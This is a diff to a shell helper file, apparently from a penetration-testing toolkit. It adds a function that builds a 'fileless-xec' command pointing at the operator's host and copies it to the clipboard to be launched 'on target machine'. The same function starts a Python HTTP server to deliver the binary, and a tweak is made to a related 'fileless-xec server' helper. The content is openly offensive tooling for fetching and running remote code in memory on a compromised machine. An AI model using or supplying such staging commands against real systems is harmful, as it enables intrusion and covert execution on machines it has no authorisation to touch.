@@ -11,12 +11,21 @@ alias cpy='xclip -selection clipboard'
 
 ## Queensono receive cpy
 
+## Fileless-xec as client (Launch a server and copy line to launch on target)
+bang.flx.client.cpy(){
+if [ "$1" = "-h" ]; then
+    echo "bang.flx.client.cpy \$AA \$AP [BINARY_NAME]"
+else
+    echo "fileless-xec http://$1:$2/$3" | cpy && echo "Command line copied to clipboard (launch it on target machine)" && python3 -m http.server $2 
+fi
+}
+
 ## Fileless-xec server cpy
 bang.flx.serve.cpy(){
 if [ "$1" = "-h" ]; then
     echo "bang.flx.serve.cpy \$AP"
 else
-    echo "fileless-xec server $1"|cpy
+    echo "fileless-xec server $1"|cpy  && echo "Command line copied to clipboard (launch it on target machine)"
 fi
 }
 
